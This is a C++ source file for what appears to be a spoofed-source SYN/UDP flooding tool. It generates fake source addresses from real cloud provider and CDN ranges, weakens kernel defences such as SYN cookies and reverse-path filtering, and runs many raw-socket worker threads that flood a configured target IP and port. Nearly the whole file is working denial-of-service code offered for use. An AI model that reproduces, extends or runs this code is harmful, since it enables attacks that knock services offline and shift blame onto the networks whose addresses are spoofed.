#include "app/application.hpp"
#include "app/thread_affinity.hpp"
#include "common/constants.hpp"
#include "common/types.hpp"
#include "config/config.hpp"
#include "packet/packet.hpp"
#include "packet/packet_strategy.hpp"
#include "packet/tcp_syn_strategy.hpp"
#include "packet/udp_strategy.hpp"
#include "transport/packet_transport.hpp"
#include "transport/file_transport.hpp"
#include "monitor/monitor_factory.hpp"
#include "random/fast_random.hpp"

#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <memory>
#include <csignal>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

namespace {

std::atomic<bool> g_running{true};
std::atomic<std::uint64_t> g_total_packets{0};
std::atomic<std::uint32_t> g_threads_ready{0};

void signal_handler(int) {
    std::cout << "\n  STOPPING..." << std::endl;
    g_running = false;
}

// Spoof IP pool — power-of-2 for bitmask indexing
alignas(64) std::uint32_t g_spoof_ips[common::SPOOF_BUF_SIZE];
std::uint32_t g_spoof_count = 0;

void generate_spoof_ips() {
    // Cloud provider CIDR ranges
    const std::vector<std::string> ranges = {
        "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
        "141.101.64.0/18", "108.162.192.0/18", "190.93.240.0/20", "188.114.96.0/20",
        "104.16.0.0/13", "104.24.0.0/14", "172.64.0.0/13",
        "13.32.0.0/15", "13.248.0.0/14", "18.34.0.0/19",
        "18.144.0.0/15", "34.192.0.0/12", "35.152.0.0/13", "52.0.0.0/10",
        "8.8.8.0/24", "8.8.4.0/24", "34.64.0.0/11", "35.184.0.0/13",
        "13.64.0.0/11", "20.0.0.0/10", "40.64.0.0/10", "51.0.0.0/10",
        "5.39.0.0/17", "46.105.0.0/16", "51.38.0.0/16", "91.121.0.0/16",
        "137.74.0.0/16", "142.44.0.0/16", "149.202.0.0/16", "158.69.0.0/16",
        "64.225.0.0/18", "68.183.0.0/16", "104.131.0.0/16",
        "128.199.0.0/16", "134.209.0.0/16", "139.59.0.0/16",
        "142.93.0.0/16", "157.230.0.0/16", "159.65.0.0/16",
        "164.90.0.0/16", "167.99.0.0/16", "188.166.0.0/16",
        "192.241.0.0/16", "198.199.0.0/16"
    };

    std::cout << "  Generating spoof IPs from " << ranges.size() << " ranges..." << std::endl;
    std::uint32_t count = 0;

    for (const auto& range : ranges) {
        auto slash = range.find('/');
        if (slash == std::string::npos) continue;

        std::string ip_str = range.substr(0, slash);
        int prefix = std::stoi(range.substr(slash + 1));
        struct in_addr addr;
        if (inet_pton(AF_INET, ip_str.c_str(), &addr) != 1) continue;

        std::uint32_t network = ntohl(addr.s_addr);
        std::uint32_t mask = (prefix == 0) ? 0 : (0xFFFFFFFF << (32 - prefix));
        std::uint32_t start = network & mask;
        std::uint32_t end = start | ~mask;

        for (std::uint32_t ip = start; ip <= end && count < common::MAX_SPOOF_IPS; ip++) {
            g_spoof_ips[count++] = htonl(ip);
        }
    }

    // Pad to power of 2
    std::uint32_t pow2 = 1;
    while (pow2 < count) pow2 <<= 1;
    randomgen::FastRandom pad_rng(count);
    for (std::uint32_t i = count; i < pow2; i++) {
        g_spoof_ips[i] = g_spoof_ips[pad_rng.next() % count];
    }
    g_spoof_count = pow2;
    std::cout << "  Total spoof IPs: " << count << " (padded to " << pow2 << ")" << std::endl;
}

} // anonymous namespace

namespace app {

Application::Application(config::Config config)
    : config_(std::move(config)) {}

int Application::run() {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    if (geteuid() != 0) {
        std::cerr << "  Must be run as root for raw sockets!" << std::endl;
        return 1;
    }

    initialize();
    create_workers();
    start_monitor();
    wait_for_shutdown();
    shutdown();
    return 0;
}

void Application::initialize() {
    generate_spoof_ips();

    // Kernel tuning
    system("sysctl -w net.ipv4.tcp_tw_reuse=1 > /dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_fin_timeout=5 > /dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_timestamps=0 > /dev/null 2>&1");
    system("sysctl -w net.core.rmem_max=268435456 > /dev/null 2>&1");
    system("sysctl -w net.core.wmem_max=268435456 > /dev/null 2>&1");
    system("sysctl -w net.core.netdev_max_backlog=500000 > /dev/null 2>&1");
    system("sysctl -w net.ipv4.ip_local_port_range=\"1024 65535\" > /dev/null 2>&1");
    system("sysctl -w net.ipv4.conf.all.rp_filter=0 > /dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_max_syn_backlog=500000 > /dev/null 2>&1");
    system("sysctl -w net.ipv4.tcp_syncookies=0 > /dev/null 2>&1");
    system("ulimit -n 2000000 > /dev/null 2>&1");
}

void Application::create_workers() {
    std::cout << "\n  Starting " << config_.worker_count << " workers..." << std::endl;

    // Pre-create strategies for mixed mode
    auto tcp_strategy = std::make_unique<packet::TcpSynStrategy>();
    auto udp_strategy = std::make_unique<packet::UdpStrategy>();

    struct WorkerArgs {
        packet::PacketStrategy* strategy;
        int thread_id;
    };

    std::vector<std::thread> workers;
    workers.reserve(config_.worker_count);

    for (std::uint32_t i = 0; i < config_.worker_count; i++) {
        packet::PacketStrategy* strat = nullptr;
        if (config_.packet_mode == config::PacketMode::Mixed) {
            strat = (i % 2 == 0) ? tcp_strategy.get() : udp_strategy.get();
        } else if (config_.packet_mode == config::PacketMode::Tcp) {
            strat = tcp_strategy.get();
        } else {
            strat = udp_strategy.get();
        }

        workers.emplace_back([this, strat, i]() {
            // Pin to CPU
            app::pin_current_thread(i);

            // Create raw socket
            int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
            if (sock < 0) { g_threads_ready++; return; }

            int one = 1;
            setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
            setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &common::SEND_BUF_SIZE, sizeof(common::SEND_BUF_SIZE));

            g_threads_ready++;

            // Worker-local state
            randomgen::FastRandom rng(std::time(nullptr) ^ (i * 0x9e3779b97f4a7c15ULL));
            common::PacketBuffer buffer;
            std::uint32_t local_pps = 0;

            struct sockaddr_in sin{};
            sin.sin_family = AF_INET;
            sin.sin_port = htons(config_.target_port);
            inet_pton(AF_INET, config_.target_ip.c_str(), &sin.sin_addr);

            packet::PacketContext ctx{config_, rng};

            while (g_running) {
                // Randomize source IP from spoof pool
                // (strategy picks random src_ip internally, but we want pool selection)
                bool sent = strat->build(ctx, buffer);
                if (sent) {
                    if (sendto(sock, buffer.ptr(), buffer.size, 0,
                               reinterpret_cast<struct sockaddr*>(&sin), sizeof(sin)) > 0) {
                        g_total_packets++;
                        local_pps++;
                    }
                }

                if (config_.rate_limit > 0 && local_pps > config_.rate_limit) {
                    while (local_pps > config_.rate_limit && g_running)
                        std::this_thread::yield();
                }
            }

            close(sock);
        });

        if (i % 100 == 0) { std::cout << "."; std::cout.flush(); }
        std::this_thread::sleep_for(std::chrono::microseconds(5));
    }

    std::cout << " READY!\n" << std::endl;

    // Wait for all threads
    while (g_threads_ready < config_.worker_count)
        std::this_thread::sleep_for(std::chrono::milliseconds(10));

    std::cout << "  All workers ready - generating packets!\n" << std::endl;

    // Join in background
    for (auto& t : workers) {
        if (t.joinable()) t.detach();
    }
}

void Application::start_monitor() {
    auto mon = monitor::create_monitor(config_.monitor_mode);
    mon->start(config_);

    while (g_running) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        monitor::MonitorSnapshot snap{
            g_total_packets.load(),
            0
        };
        mon->update(snap);
    }

    mon->stop();
}

void Application::wait_for_shutdown() {
    while (g_running)
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
}

void Application::shutdown() {
    std::cout << "\n\n  Final total: " << g_total_packets.load() << " packets" << std::endl;
}

} // namespace app
